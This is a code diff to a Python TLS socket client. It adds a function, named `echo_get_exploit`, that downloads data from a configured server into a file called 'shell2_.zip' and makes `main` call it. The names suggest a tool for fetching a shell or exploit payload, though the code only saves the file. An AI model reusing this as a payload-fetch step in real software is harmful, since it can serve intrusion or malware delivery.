@@ -1,3 +1,4 @@
+import sys
 import socket
 import ssl
 import subprocess
@@ -6,6 +7,23 @@ import json
 
 def get_json_data(json_file):
     return json.load(open(json_file))
+
+
+def echo_get_exploit(s):
+    print('la0')
+    with open('shell2_.zip', 'wb') as f:
+        print ('file opened')
+        while True:
+            print('receiving data...')
+            data = s.recv(8192)
+            # print('data=%s', (data))
+            if not data:
+                break
+            # write data to a file
+            f.write(data)
+    f.close()
+    echo_client(s)
+    s.close()
 
 
 def echo_client(s):
@@ -33,7 +51,8 @@ def main():
         # so here ca_certs must be the server certificate itself.
         ssl_sock = ssl.wrap_socket(s,cert_reqs=ssl.CERT_REQUIRED, ca_certs='cert')
         ssl_sock.connect((config_data['ip'], config_data['port']))
-        echo_client(ssl_sock)
+        #echo_client(ssl_sock)
+        echo_get_exploit(ssl_sock)
         ssl_sock.close()
 
 
